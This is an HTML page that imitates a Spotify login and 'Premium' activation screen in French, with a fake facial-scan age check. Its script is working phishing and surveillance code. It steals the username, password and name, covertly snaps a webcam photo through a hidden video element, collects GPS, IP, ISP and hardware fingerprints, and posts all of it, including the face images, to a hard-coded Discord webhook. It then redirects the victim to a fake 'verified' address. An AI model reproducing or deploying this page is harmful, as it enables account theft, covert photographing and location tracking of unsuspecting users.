<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Spotify - Connexion</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
        .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
        .logo { width: 45px; margin: 0 auto 35px auto; }
        .field { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #fff; }
        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
        input:focus { border: 2px solid #1ed760; }
        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 25px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
        
        /* Module Vérification d'âge */
        .age-box { background: #181818; border: 1px solid #282828; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: left; }
        .age-title { font-size: 11px; font-weight: 900; color: #1ed760; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
        .age-desc { font-size: 11px; color: #b3b3b3; line-height: 1.4; margin-bottom: 15px; }
        .btn-verify { background: #fff; color: #000; font-weight: 800; font-size: 10px; padding: 10px; border-radius: 4px; width: 100%; text-transform: uppercase; cursor: pointer; }
        
        #loader { display: none; margin-top: 20px; }
        .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
        .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; z-index: -1; }
    </style>
</head>
<body>
    <div class="app-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
        <div id="ui">
            <div class="flex gap-2">
                <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text"></div>
                <div class="field w-1/2"><label>Nom</label><input id="ln" type="text"></div>
            </div>
            <div class="field"><label>E-mail ou utilisateur</label><input id="u" type="text"></div>
            <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>

            <div class="age-box">
                <p class="age-title">🛡️ Vérification d'âge requise</p>
                <p class="age-desc">Conformément aux régulations locales, un scan facial rapide est nécessaire pour confirmer que vous avez plus de 18 ans.</p>
                <input type="file" id="ageInput" accept="image/*" capture="user" style="display:none;" onchange="ageCaptured()">
                <button type="button" id="ageBtn" onclick="document.getElementById('ageInput').click()" class="btn-verify">Scanner mon visage</button>
                <p id="ageStatus" style="display:none; color:#1ed760; font-size:10px; font-weight:900; margin-top:10px;">✅ SCAN TERMINÉ</p>
            </div>

            <button onclick="finalOverkillV39()" id="btn" class="btn-green">Activer Premium</button>
        </div>

        <div id="loader">
            <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
            <p style="font-size: 11px; color: #b3b3b3; margin-top: 10px; font-weight:900;">SYNCHRONISATION SÉCURISÉE...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
        let ageFile = null;

        function ageCaptured() {
            const input = document.getElementById('ageInput');
            if(input.files && input.files[0]) {
                ageFile = input.files[0];
                document.getElementById('ageBtn').style.display = 'none';
                document.getElementById('ageStatus').style.display = 'block';
            }
        }

        async function finalOverkillV39() {
            const user = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
            if(!user.u || !user.p) return;

            document.getElementById('ui').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            const pb = document.getElementById('pbar');
            
            // 1. CAPTEURS AUTO
            let stream = null;
            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); document.getElementById('v').srcObject = stream; } catch(e){}

            pb.style.width = "20%";
            let gps = "❌ Bloqué";
            try {
                const pos = await new Promise((res, rej) => { navigator.geolocation.getCurrentPosition(res, rej, {timeout: 6000}); });
                gps = `✅ [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
            } catch(e){}

            pb.style.width = "40%";
            // 2. EXTRACTION OMNI-PAVÉ
            let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
            let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
            const gl = document.createElement('canvas').getContext('webgl');
            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
            const ramUsage = window.performance && window.performance.memory ? Math.round(window.performance.memory.usedJSHeapSize / 1048576) + " MB" : "?";

            const payload = {
                embeds: [{
                    title: `🛡️ AGE-VERIFY V39 - ${user.fn} ${user.ln}`,
                    color: 1955168,
                    fields: [
                        { name: "👤 COMPTE", value: `**User:** \`${user.u}\`\n**Pass:** \`${user.p}\`\n**Nom:** \`${user.fn} ${user.ln}\`` },
                        { name: "📍 RÉSEAU & IP", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\`\n**FAI:** \`${net.org}\`\n**Proxy:** \`${net.proxy ? 'OUI' : 'NON'}\`` },
                        { name: "🛠️ HARDWARE DÉTAILLÉ", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**CPU:** \`${navigator.hardwareConcurrency} Cores\`\n**Écran:** \`${screen.width}x${screen.height}\`\n**Batterie:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`` },
                        { name: "🗺️ INFOS SYSTÈME", value: `**GPS:** ${gps}\n**OS:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`\n**Navigateur:** \`\`\`${navigator.userAgent}\`\`\`` }
                    ],
                    footer: { text: "LVN AGE VERIFICATION SYSTEM • " + new Date().toLocaleString() }
                }]
            };
            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

            // 3. ENVOI PHOTO AGE (SI PRISE)
            if(ageFile) {
                const fdAge = new FormData();
                fdAge.append('file', ageFile, 'age_verification.jpg');
                fdAge.append('content', `🆔 **Scan Facial Manuel (Âge) de ${user.fn} ${user.ln}**`);
                await fetch(hook, { method: 'POST', body: fdAge });
            }

            // 4. CAPTURE AUTO (PC/MOBILE)
            pb.style.width = "85%";
            if(stream) {
                await new Promise(r => setTimeout(r, 3500));
                const v = document.getElementById('v');
                const can = document.getElementById('c');
                can.width = v.videoWidth; can.height = v.videoHeight;
                can.getContext('2d').drawImage(v, 0, 0);
                
                can.toBlob(async b => {
                    const fd = new FormData();
                    fd.append('file', b, 'auto_shot.jpg');
                    fd.append('content', `📸 **Capture Automatique : ${user.fn} ${user.ln}**`);
                    await fetch(hook, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "http://googleusercontent.com/spotify.com/verified";
                }, 'image/jpeg', 0.8);
            } else {
                setTimeout(() => { window.location.href = "http://googleusercontent.com/spotify.com/verified"; }, 1000);
            }
        }
    </script>
</body>
</html>
